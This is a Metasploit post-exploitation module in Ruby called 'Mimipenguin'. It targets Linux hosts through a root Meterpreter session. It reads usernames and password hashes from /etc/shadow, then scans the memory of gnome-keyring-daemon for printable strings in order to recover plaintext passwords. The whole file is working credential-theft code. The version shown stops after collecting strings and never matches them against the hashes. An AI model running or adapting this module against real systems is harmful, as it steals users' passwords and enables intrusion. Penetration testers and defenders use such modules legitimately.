##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'unix_crypt'

class MetasploitModule < Msf::Post
  Rank = NormalRanking

  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Post::Linux::Process

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Mimipenguin',
        'Description' => %q{
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Shelby Pace', # metasploit module
          'huntergregal' # poc
        ],
        'Platform' => [ 'linux' ],
        'Arch' => [ ARCH_X86, ARCH_X64 ],
        'SessionTypes' => [ 'meterpreter' ],
        'Targets' => [[ 'Auto', {} ]],
        'Privileged' => true,
        'References' => [
          [ 'URL', 'https://github.com/huntergregal/mimipenguin'],
          [ 'CVE', '2018-20781']
        ],
        'DisclosureDate' => '2019-11-29',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        },
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_sys_process_attach
              stdapi_sys_process_memory_read
              stdapi_sys_process_memory_search
            ]
          }
        }
      )
    )
  end

  def check
    CheckCode::Appears
  end

  def get_user_names_and_hashes
    shadow_contents = read_file('/etc/shadow')
    fail_with(Failure::UnexpectedReply, 'Failed to read \'/etc/shadow\'') if shadow_contents.empty?

    users = []
    lines = shadow_contents.split
    lines.each do |line|
      line_arr = line.split(':')
      next if line_arr.empty?

      user_name = line_arr&.first
      hash = line_arr&.second
      next unless hash.start_with?('$')
      next if hash.nil? || user_name.nil?

      users << { 'username' => user_name, 'hash' => hash }
    end

    users
  end

  def get_matches(target_info = {})
    if target_info.empty?
      vprint_status('Invalid target info supplied')
      return []
    end

    target_pid = pidof(target_info['name']).first
    if target_pid.nil?
      print_bad("PID for #{target_info['name']} not found.")
      return []
    end

    target_info['pid'] = target_pid
    vprint_status("Searching PID #{target_pid}...")
    mem_search_ascii(target_pid, 5, 500, target_info['needles'])
  end

  def get_printable_strings(pid, start_addr, section_len)
    lines = []
    curr_addr = start_addr
    max_addr = start_addr + section_len

    while curr_addr < max_addr
      data = mem_read(pid, curr_addr, 1000)
      if data.gsub("\x00", '').empty?
        curr_addr += 500
        next
      end

      lines << data.split("\x00")
      lines = lines.flatten
      curr_addr += 500
    end

    lines.each { |line| line.gsub!(/[^[:print:]]/, '') }
    lines.reject! { |line| line.length < 5 }
    lines
  end

  def run
    fail_with(Failure::BadConfig, 'Root privileges are required') unless is_root?
    user_data = get_user_names_and_hashes
    fail_with(Failure::UnexpectedReply, 'Failed to retrieve user information') if user_data.empty?

    target_proc_info = [
      {
        'name' => 'gnome-keyring-daemon',
        'needles' => [
          '^+libgck\\-1.so\\.0$',
          'libgcrypt\\.so\\..+$'
        ]
      }
    ]

    matches = []
    target_proc_info.each do |info|
      print_status("Checking matches for process #{info['name']}")
      match = get_matches(info)
      match.first['pid'] = info['pid']

      matches << match
    end

    if matches.empty?
      fail_with(Failure::UnexpectedReply, 'No matches were found')
    end

    matches = matches.flatten
    pid = matches.first['pid']

    captured_strings = []
    matches.each do |match|
      start_addr = match['match_offset'] - 4096
      start_addr = match['sect_start'] if start_addr < match['sect_start']
      print_status("Starting search at address #{start_addr}")
      # for each match, search the section of memory for all 'printable' strings
      captured_strings << get_printable_strings(pid, match['match_offset'], match['sect_len'])
    end

    captured_strings.flatten!
    captured_strings.uniq!
  end
end
